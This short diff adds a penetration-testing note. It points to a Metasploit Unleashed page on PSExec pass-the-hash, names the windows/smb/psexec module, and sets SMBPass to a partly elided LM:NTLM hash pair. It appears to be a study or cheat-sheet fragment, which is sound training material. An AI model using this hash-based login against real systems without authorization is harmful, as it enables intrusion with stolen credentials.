@@ -1,0 +1,5 @@
+https://www.offsec.com/metasploit-unleashed/psexec-pass-hash/
+
+METASPLOIT:
+windows/smb/psexec
+set SMBPass e52cac6741...3fa6cb6d:8846f7eaee...830b7586c
